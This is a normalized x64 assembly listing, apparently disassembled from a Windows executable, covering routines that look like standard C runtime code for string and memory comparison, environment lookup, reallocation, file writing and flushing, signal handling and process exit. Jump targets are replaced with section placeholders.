jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_14003d9b8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rbx [ rw-data ]
mov rsi rcx
je r-xdata
xor eax eax
test rbx rbx
jne r-xdata
test rsi rsi
je r-xdata
cmp [ rw-data ] rbx
je r-xdata
mov rcx rsi
call sub_14003f7f0
mov rdi rax
call sub_14004ce78
test eax eax
jne r-xdata
call sub_14003f7f0
cmp rax rdi
jbe r-xdata
mov rbx [ rw-data ]
test rbx rbx
je r-xdata
add rbx 0x8
jmp r-xdata
mov rcx [ rbx ]
cmp [ rcx + rdi ] 0x3d
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov r8 rdi
mov rdx rsi
call sub_14004ce70
test eax eax
je r-xdata
mov rax [ rbx ]
lea rax [ rax + rdi + 0x1 ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14003da5c
push rbx
sub rsp 0x20
mov rbx rcx
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
mov edx 0x7fff
call sub_14004cf6c
xor ecx ecx
cmp rax 0x7fff
setb cl
test ecx ecx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
mov ecx 0x7
call sub_140046c48
nop
mov rcx rbx
call sub_14003d9b8
mov rbx rax
mov ecx 0x7
call sub_140046b48
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_14003dac8
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_14003a6a0
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_14003db4c
xor r11d r11d
mov r10 rdx
mov r8 rcx
cmp [ rdx ] r11w
jne r-xdata
movzx eax [ rcx ]
test ax ax
je r-xdata
mov rax rcx
retn
xor eax eax
retn
mov r9 rcx
sub r9 rdx
cmp [ rdx ] r11w
je r-xdata
cmp [ rdx ] r11w
je r-xdata
mov rax r8
retn
add r8 0x2
add r9 0x2
movzx eax [ r8 ]
test ax ax
jne r-xdata
movzx ecx [ r9 + rdx ]
movzx eax [ rdx ]
cmp ecx eax
jne r-xdata
mov rdx r10
test ax ax
je r-xdata
add rdx 0x2
cmp [ r9 + rdx ] r11w
jne r-xdata
sub_14003dbb0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x50
and [ rbp - 0x30 ] 0x0
mov rdi rdx
xor edx edx
mov rsi r8
mov rbx rcx
lea r8d [ rdx + 0x28 ]
lea rcx [ rbp - 0x28 ]
mov r12 r9
call sub_14003d760
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rbx
mov [ rbp - 0x30 ] rbx
cmp rdi 0x3fffffff
jbe r-xdata
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x50
pop rbp
retn
lea eax [ rdi + rdi ]
mov [ rbp - 0x28 ] eax
mov [ rbp - 0x28 ] 0x7fffffff
jmp r-xdata
dec [ rbp - 0x28 ]
js r-xdata
mov r9 [ rbp + 0x30 ]
lea rcx [ rbp - 0x30 ]
mov r8 r12
mov rdx rsi
call sub_14004d0b0
mov edi eax
test rbx rbx
je r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_140044da8
mov rax [ rbp - 0x30 ]
mov rax [ rbp - 0x30 ]
mov [ rax ] 0x0
mov rax [ rbp - 0x30 ]
inc rax
mov [ rbp - 0x30 ] rax
jmp r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_140044da8
mov [ rax ] 0x0
jmp r-xdata
dec [ rbp - 0x28 ]
js r-xdata
mov eax edi
sub_14003dcc4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov [ rax + 0x10 ] rdx
push r12
push r13
push r14
sub rsp 0x20
mov r13 r9
mov r12 r8
mov rdi rdx
mov r14 rcx
xor esi esi
xor eax eax
test rdx rdx
setne al
test eax eax
jne r-xdata
xor eax eax
test r8 r8
setne al
test eax eax
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
mov rcx rdx
call sub_14003bd5c
nop
test [ rdi + 0x18 ] 0x40
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
test esi esi
jne r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_14003bdf4
mov eax esi
mov rcx rdi
call sub_14004dba4
mov ebx eax
mov r9 [ rsp + 0x60 ]
mov r8 r13
mov rdx r12
mov rcx rdi
call r14
mov esi eax
mov rdx rdi
mov ecx ebx
call sub_14004dc78
nop
lea rcx [ rw-data ]
mov rdx rcx
lea r8 [ rw-data ]
cmp eax 0xfffffffe
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or esi 0xffffffff
cmp eax 0xffffffff
je r-xdata
movsxd rdx eax
mov rcx rdx
sar rcx 0x5
lea r8 [ rw-data ]
and edx 0x1f
imul rdx rdx 0x58
add rdx [ r8 + rcx * 8 ]
lea rcx [ rw-data ]
jmp r-xdata
test [ rcx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ rdx + 0x38 ] 0x7f
jne r-xdata
movsxd rcx eax
mov rax rcx
sar rax 0x5
and ecx 0x1f
imul rcx rcx 0x58
add rcx [ r8 + rax * 8 ]
sub_14003de2c
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_14003de98
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_140042e9c
mov rcx rbx
call sub_140043568
mov rcx rbx
call sub_14004ea18
mov rcx rbx
call sub_14004e834
mov rcx rbx
call sub_14003e1ec
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_14004e814
sub_14003dedc
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_14003df10
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_14003df4c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ r--data ] 0x0
mov ebx ecx
je r-xdata
call sub_14004cd34
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_14003df10
test eax eax
jne r-xdata
lea rcx [ r--data ]
call sub_14004eaa0
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_14004bf48 ]
call sub_14004005c
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ r--data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_14004eaa0
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_14003dffc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_140046c48
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x1
mov ecx 0x8
call sub_140046b48
mov ecx r15d
call sub_14003de2c
mov ecx r15d
call [ ExitProcess@IAT ]
mov ecx 0x8
call sub_140046b48
test r12d r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_14003dedc
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_14003dedc
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
cmp rdi rsi
jb r-xdata
jmp r-xdata
mov rcx [ rdi ]
call [ DecodePointer@IAT ]
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
cmp r14 rbx
jne r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
jmp r-xdata
cmp r13 rax
je r-xdata
sub_14003e21c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebx ecx
xor edi edi
mov [ rsp + 0x60 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_140043bb0
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_14003e198
int3
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ r--data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_140046c48
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov edi 0x1
mov [ rsp + 0x60 ] edi
call [ DecodePointer@IAT ]
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x28 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x60 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ r--data ]
mov edx ecx
mov [ rsp + 0x20 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x28 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
dec edx
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_140046b48
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x20 ] edx
mov ecx [ r--data ]
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ r--data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
mov [ rsi + 0xb0 ] r14d
jmp r-xdata
cmp ebx 0x4
jne r-xdata
sub_14003e450
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_14003b928
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x1
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x1
lea r8 [ rsp + 0x20 ]
mov edx 0x1
mov ecx ebx
call sub_14004b7b4
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_14003e4d0
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_14003b928
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x2
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x2
lea r8 [ rsp + 0x20 ]
mov edx 0x2
mov ecx ebx
call sub_14004b7b4
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_14003e550
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_14003b928
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x4
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x4
lea r8 [ rsp + 0x20 ]
mov edx 0x4
mov ecx ebx
call sub_14004b7b4
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_14003e5d0
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_14003b928
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x80
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x80
lea r8 [ rsp + 0x20 ]
mov edx 0x80
mov ecx ebx
call sub_14004b7b4
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_14003e654
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_14003b928
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x8
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x8
lea r8 [ rsp + 0x20 ]
mov edx 0x8
mov ecx ebx
call sub_14004b7b4
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_14003e6d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_14003ae78
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_14003ad04
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_140042ea4
call sub_14003f1a4
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_14003f1a4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f15c
mov [ rbx ] eax
mov rcx rbx
call sub_140042ea4
test eax eax
je r-xdata
call sub_14003f1a4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f15c
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_14003e7c0
mov r11 rcx
or r8 r8
je r-xdata
mov rax r11
retn
sub rcx rdx
test dl 0x7
je r-xdata
mov rax [ rdx ]
sub r8 0x8
jbe r-xdata
mov al [ rdx ]
test al al
mov [ rcx + rdx ] al
je r-xdata
add r8 0x8
je r-xdata
mov r9 0x7efefefefefefeff
add r9 rax
mov r10 rax
xor r10 0xffffffffffffffff
xor r10 r9
mov r9 0x8101010101010100
test r9 r10
je r-xdata
add rcx rdx
xor rdx rdx
cmp r8 0x10
jb r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
test al al
mov [ rcx + rdx ] al
je r-xdata
mov [ rcx + rdx ] rax
add rdx 0x8
sub r8 0x1
jb r-xdata
test cl 0x7
je r-xdata
test dl 0x7
jne r-xdata
inc rdx
dec r8
je r-xdata
mov rax r11
retn
mov [ rcx ] dl
inc rcx
jmp r-xdata
sub r8 0x20
jb r-xdata
inc rcx
mov [ rcx ] dl
dec r8
jmp r-xdata
jmp r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
add r8 0x20
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
mov [ rcx + 0x18 ] rdx
add rcx 0x20
sub r8 0x20
jae r-xdata
inc rdx
dec r8
je r-xdata
add r8 0x8
mov [ rcx ] rdx
add rcx 0x8
jmp r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
sub r8 0x8
jb r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr rax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
je r-xdata
shr eax 0x10
test al al
mov [ rcx + rdx ] al
je r-xdata
inc rdx
dec r8
je r-xdata
test ah ah
mov [ rcx + rdx ] ah
je r-xdata
inc rdx
dec r8
jne r-xdata
sub_14003e924
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov edi ecx
call sub_140043bb0
mov rbx rax
test rax rax
jne r-xdata
cmp [ rax + 0x38 ] 0x0
jne r-xdata
lea rax [ r--data ]
mov rbx [ rbx + 0x38 ]
test edi edi
js r-xdata
mov edx 0x1
mov ecx 0x86
call sub_140041704
mov [ rbx + 0x38 ] rax
test rax rax
je r-xdata
call sub_14004eae4
mov edi [ rax ]
call sub_14004eae4
cmp edi [ rax ]
jl r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov rax rbx
jmp r-xdata
call sub_14004eaec
movsxd rcx edi
mov edx 0x86
mov r8 [ rax + rcx * 8 ]
mov rcx rbx
call sub_140042dcc
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
sub_14003e9c0
jmp r-xdata
mov al [ rcx ]
test al al
jne r-xdata
cmp al dl
je r-xdata
cmp al dl
jne r-xdata
mov rax rcx
retn
inc rcx
xor eax eax
retn
sub_14003e9f0
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_14003eaf0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi r9
mov r15 r8
mov r12 rdx
mov r14 rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor edx edx
or rax 0xffffffffffffffff
div r12
cmp r8 rax
ja r-xdata
mov rdi r12
imul rdi r15
test [ r9 + 0x18 ] 0x10c
mov rbp rdi
je r-xdata
mov r13d 0x1000
mov r13d [ r9 + 0x24 ]
jmp r-xdata
mov rax r15
jmp r-xdata
mov eax [ rsi + 0x18 ]
and eax 0x108
je r-xdata
test rdi rdi
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov ebx r13d
cmp rbp rbx
jb r-xdata
mov ecx [ rsi + 0x8 ]
test ecx ecx
je r-xdata
movsx ecx [ r14 ]
mov rdx rsi
call sub_140044da8
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
js r-xdata
sub rdi rbp
xor edx edx
mov rax rdi
div r12
jmp r-xdata
inc r14
dec rbp
cmp [ rsi + 0x24 ] 0x0
mov r13d 0x1
cmovg r13d [ rsi + 0x24 ]
test r13d r13d
je r-xdata
mov rcx rsi
call sub_14003ed0c
test eax eax
jne r-xdata
or [ rsi + 0x18 ] 0x20
cmp rbp rcx
mov rdx r14
cmovb ecx ebp
mov [ rsp + 0x58 ] ecx
mov ebx ecx
mov r8d ecx
mov rcx [ rsi ]
call sub_14003a8c0
mov eax [ rsp + 0x58 ]
add [ rsi ] rbx
sub [ rsi + 0x8 ] eax
sub rbp rbx
add r14 rbx
jmp r-xdata
je r-xdata
mov ebx ebp
xor edx edx
mov rax rbp
div rbx
mov ebx ebp
sub ebx edx
jmp r-xdata
test rbp rbp
jmp r-xdata
mov ecx eax
cmp eax ebx
cmova ecx ebx
sub rbp rcx
add r14 rcx
cmp eax ebx
jae r-xdata
mov rcx rsi
call sub_14003be60
mov r8d ebx
mov rdx r14
mov ecx eax
call sub_14004f254
cmp eax 0xffffffff
je r-xdata
sub_14003ec7c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r9
push r12
sub rsp 0x20
mov rbx r9
mov rdi r8
mov rsi rdx
mov r12 rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
xor eax eax
test rbx rbx
setne al
test eax eax
jne r-xdata
mov rcx rbx
call sub_14003bd5c
nop
mov r9 rbx
mov r8 rdi
mov rdx rsi
mov rcx r12
call sub_14003eaf0
mov rdi rax
mov rcx rbx
call sub_14003bdf4
mov rax rdi
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_14003ed0c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_14003be60
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_14004f254
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_14003ed88
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_14003ed0c
test eax eax
je r-xdata
add rsp 0x20
pop rbx
jmp sub_14003edd4
test [ rbx + 0x18 ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov rcx rbx
call sub_14003be60
mov ecx eax
call sub_14004f334
neg eax
sbb eax eax
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_14003edd4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r15
sub rsp 0x30
mov r13d ecx
xor esi esi
xor edi edi
lea ecx [ rsi + 0x1 ]
call sub_140046c48
nop
xor ebx ebx
or r15d 0xffffffff
mov ecx 0x1
call sub_140046b48
cmp r13d 0x1
cmove edi esi
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r13
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
